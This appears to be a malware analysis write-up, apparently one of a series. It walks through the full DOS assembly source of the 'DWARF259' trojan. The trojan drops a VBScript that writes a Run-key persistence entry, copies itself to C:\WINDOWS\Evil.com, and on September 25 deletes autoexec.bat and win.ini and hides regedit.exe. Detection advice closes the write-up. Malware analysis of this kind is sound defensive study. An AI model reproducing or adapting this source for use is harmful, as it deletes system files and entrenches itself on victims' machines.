
**Malware Analysis: DWARF259 - A Time-Triggered File Dropper and System Disruptor**

This assembly code creates two files: a VBScript (`Dwarf.vbs`) and a copy of itself (`Evil.com`). The malware's destructive payload is triggered on a specific date (September 25th). We will break down the code section by section.

**1. Initial Jump (TOUT_DEBUT)**

```assembly
TOUT_DEBUT:   jmp FILE1

```

-   **`jmp FILE1`**: This immediately jumps to the `FILE1` label, skipping the destructive payload section initially. This is a common technique to avoid immediate detection and to allow the malware to install itself before triggering its main functionality.

**2. Date Check and Destructive Payload (VERIFICATION to FIN_VIRUS)**

```assembly
VERIFICATION:   mov ah,2Ah
                int 21h
                cmp dh,9
                jnz FIN_VIRUS
                cmp dl,25           ;25 SEPTEMBRE ?
                jnz FIN_VIRUS       ;NON : FIN DU TROJAN
AFFICHE:		mov ah,9
				lea dx,MSG
				int 21h
DISQUE: 		mov ah,41h
                mov dx,offset AUTOEXEC
                int 21h             ;EFFACE AUTOEXEC.BAT
				mov dx,offset WININI
                int 21h             ;EFFACE WIN.INI
				mov ah,56h
                mov dx,offset REG       ;RENOMME REGEDIT.EXE
                mov di,offset CORBEILLE ;EN DWARF.AZE
				int 21h
FIN_VIRUS:      mov ah,4Ch
                int 21h

```

-   **`mov ah, 2Ah` / `int 21h`**: This gets the current system date. `int 21h` with `ah=2Ah` returns the year in `CX`, the month in `DH`, and the day of the month in `DL`.
-   **`cmp dh, 9` / `jnz FIN_VIRUS`**: Checks if the month (`DH`) is September (9). If it's not September, the code jumps to `FIN_VIRUS`, bypassing the destructive actions.
-   **`cmp dl, 25` / `jnz FIN_VIRUS`**: Checks if the day of the month (`DL`) is 25. If it's not the 25th, the code jumps to `FIN_VIRUS`.
-   **`AFFICHE`**: If the date _is_ September 25th, this section is executed.
    -   `mov ah, 9` / `lea dx, MSG` / `int 21h`: Displays a taunting message (`MSG`) to the user, indicating the malware has activated.
-   **`DISQUE`:** This is where the destructive payload is located.
    -   **`mov ah, 41h` / `mov dx, offset AUTOEXEC` / `int 21h`**: Deletes `C:\autoexec.bat`. `int 21h` with `ah=41h` is the DOS function to delete a file.
    -   **`mov dx, offset WININI` / `int 21h`**: Deletes `C:\WINDOWS\Win.ini`. This file, while less critical in later Windows versions, was essential in older systems (Windows 95/98) for system configuration. Deleting it could cause significant system instability.
    -   **`mov ah, 56h` / `mov dx, offset REG` / `mov di, offset CORBEILLE` / `int 21h`**: Renames `C:\WINDOWS\Regedit.exe` to `C:\RECYCLED\dwarf.aze`. `int 21h` with `ah=56h` is the DOS function to rename a file. This effectively disables the Registry Editor, making it much harder for the user to remove the malware's persistence mechanism (which we'll see later). Moving it to the Recycle Bin ("RECYCLED" - the name can be different depending of the system language) is an attempt to hide the file.
-   **`FIN_VIRUS`**:
    -   `mov ah, 4Ch` / `int 21h`: Terminates the currently running instance of the malware. _Important Note:_ This termination only applies to this _instance_. The persistence mechanism (added by the VBScript) will still cause the malware to run again on the next reboot.

**3. Data Definitions for the Payload**

```assembly
MSG     db 7,7,7,'TROJAN.DWARF par PandaKiller (c)2000'
        db 10,10,13,'BOOM! BOOM! BOOM! BOOM! BOOM! BOOM!'
        db 10,13,'   ÛÛÛ  Û    Û  ÛÛ  ÛÛÛ   ÛÛÛÛ'
        db 10,13,'   Û  Û Û    Û Û  Û Û  Û Û    '
        db 10,13,'   Û  Û Û    Û ÛÛÛÛ ÛÛÛ   ÛÛÛ '
        db 10,13,'   Û  Û Û Û  Û Û  Û Û Û   Û    '
        db 10,13,'   ÛÛÛ   Û  Û  Û  Û Û  Û  Û    $'

WININI		db 'C:\WINDOWS\Win.ini',0
AUTOEXEC	db 'C:\autoexec.bat',0
REG		db 'C:\WINDOWS\Regedit.exe',0
CORBEILLE 	db 'C:\RECYCLED\dwarf.aze',0
progl2 equ $-VERIFICATION

```

-   **`MSG`**: The message displayed on September 25th.
-   **`WININI`, `AUTOEXEC`, `REG`, `CORBEILLE`**: These are the file paths used in the destructive payload. They are null-terminated strings.
-   `progl2 equ $-VERIFICATION`: Calculates the size of the second program that will be written to a file.

**4. Creating the First File (FILE1)**

```assembly
FILE1:      mov ah,3Ch
            xor cx,cx
            mov dx,offset NOM1
            int 21h             ;CREATION DU 1ER FICHIER
            xchg ax,bx
            mov ah,40h
            mov cx,progl1       ;LONGUEUR DU PROGRAMME
            mov dx,offset prog1 ;DEBUT DU PROGRAMME
            int 21h             ;ECRITURE
            mov ah,3Eh
            int 21h             ;FERMETURE

```

-   This section is very similar to the file creation in the previous malware.
-   **`mov ah, 3Ch` / `xor cx, cx` / `mov dx, offset NOM1` / `int 21h`**: Creates a file named `C:\Dwarf.vbs` (defined by `NOM1`).
-   **`xchg ax, bx`**: Swaps the file handle (returned in `AX`) to `BX`.
-   **`mov ah, 40h` / `mov cx, progl1` / `mov dx, offset prog1` / `int 21h`**: Writes the VBScript code (defined at `prog1`) to the file. `progl1` holds the length of the VBScript code.
-   **`mov ah, 3Eh` / `int 21h`**: Closes the file.

**5. Creating the Second File (FILE2)**

```assembly
FILE2:      mov ah,3Ch
            xor cx,cx
            mov dx,offset NOM2
            int 21h             ;CREATION DU 2ND FICHIER
            xchg ax,bx
            mov ah,40h
            mov cx,progl2       ;LONGUEUR DU PROGRAMME
            lea dx,VERIFICATION ;DEBUT DU PROGRAMME
            int 21h             ;ECRITURE
            mov ah,3Eh
            int 21h             ;FERMETURE

```

-   This section creates the second file, which is a copy of the malware itself.
-   **`mov ah, 3Ch` / `xor cx, cx` / `mov dx, offset NOM2` / `int 21h`**: Creates a file named `C:\WINDOWS\Evil.com` (defined by `NOM2`). This places a copy of the malware in the `WINDOWS` directory.
-   **`xchg ax, bx`**: Swaps the file handle.
-   **`mov ah, 40h` / `mov cx, progl2` / `lea dx, VERIFICATION` / `int 21h`**: This is the key difference. It writes a copy of the _malware's code itself_ (from the `VERIFICATION` label to the end of that section, with length `progl2`) to `Evil.com`. This creates a self-replicating component.
-   **`mov ah, 3Eh` / `int 21h`**: Closes the file.

**6. Program Termination (FIN)**

```assembly
FIN:         mov ah,4Ch
             int 21h

```

-   `mov ah, 4Ch` / `int 21h`: Terminates the program.

**7. Data Definitions for File Creation and VBScript**

```assembly
NOM1    db 'c:\Dwarf.vbs',0
NOM2    db 'c:\WINDOWS\Evil.com',0
prog1   db 'rem DwArF.vbs by Panda (c)2000',0Dh,0Ah
        db 'msgbox "C''EST PARTI",vbcritical',0Dh,0Ah
        db 'Dim W',0Dh,0Ah
        db 'Set W = Wscript.CreateObject("WScript.Shell")',0Dh,0Ah
        db 'W.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows'
        db '\CurrentVersion\Run\DwArF", "C:\WINDOWS\Evil.com"'
progl1  equ $-prog1
end TOUT_DEBUT

```

-   **`NOM1`**: Filename for the VBScript: `c:\Dwarf.vbs`.
-   **`NOM2`**: Filename for the copy of the malware: `c:\WINDOWS\Evil.com`.
-   **`prog1`**: The VBScript code that will be written to `Dwarf.vbs`.
-   **`progl1 equ $-prog1`**: Calculates the length of the VBScript code.

**8. The Dropped VBScript (Persistence)**

Let's examine the VBScript code written to `c:\Dwarf.vbs`:

```VBScript
rem DwArF.vbs by Panda (c)2000
msgbox "C'EST PARTI",vbcritical
Dim W
Set W = Wscript.CreateObject("WScript.Shell")
W.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\DwArF", "C:\WINDOWS\Evil.com"

```

-   **`rem ...`**: Comment.
-   **`msgbox "C'EST PARTI",vbcritical`**: Displays a message box with the text "C'EST PARTI" (It's on!) and a critical icon. This is a user-visible indication that the malware is active.
-   **`Dim W` / `Set W = ...`**: Creates a `WScript.Shell` object (same as the previous malware).
-   **`W.Regwrite ...`**: This is the crucial persistence mechanism. It writes to the registry:
    -   **`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\DwArF`**: Creates (or modifies) a registry entry under the `Run` key, which ensures that the specified program runs on startup. The value name is `DwArF`.
    -   **`"C:\WINDOWS\Evil.com"`**: This is the _value_ associated with `DwArF`. It specifies that `C:\WINDOWS\Evil.com` (the copy of the malware) should be executed on every system startup.

**Summary: Impact and Detection**

DWARF259 is a more sophisticated piece of malware than the first example. Here's a summary:

-   **Dropper:** It drops a VBScript (`Dwarf.vbs`) and a copy of itself (`Evil.com`).
-   **Persistence:** The VBScript ensures that `Evil.com` runs on every startup by adding a registry entry to the `Run` key.
-   **Time-Triggered Payload:** On September 25th, the malware:
    -   Displays a message.
    -   Deletes `autoexec.bat` and `win.ini` (potentially causing significant system instability).
    -   Renames `Regedit.exe` to `dwarf.aze` in the Recycle Bin, hindering the user's ability to remove the malware.
-   **Self-Replication:** The malware copies itself to `C:\WINDOWS\Evil.com`, which is then executed on each reboot.

**Detection Strategies:**

1.  **Signature-Based:** Antivirus can detect the specific assembly code patterns or the VBScript content.
2.  **Heuristic:** Behavioral analysis can detect:
    -   File creation in `C:\` and `C:\WINDOWS`.
    -   Modification of the `Run` registry key.
    -   Deletion of `autoexec.bat` and `win.ini`.
    -   Renaming of `Regedit.exe`.
    -   The message box displayed by the VBScript.
3.  **File System Monitoring:** Monitor for the creation of `Dwarf.vbs` and `Evil.com`.
4.  **Registry Monitoring:** Monitor the `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run` key for changes.
5.  **Date-Based Detection:** While not a primary detection method, security tools could potentially flag the date check (September 25th) as suspicious.
6.  **Sandboxing**: Running the assembly code will allow the creation of the files, and if the date is set accordingly, the deletion of the files.

This malware is a good example of how relatively simple assembly code can be used to create a persistent and destructive threat. The combination of a dropper, a persistence mechanism, a time-triggered payload, and self-replication makes it more dangerous than a simple virus that only performs a single action.
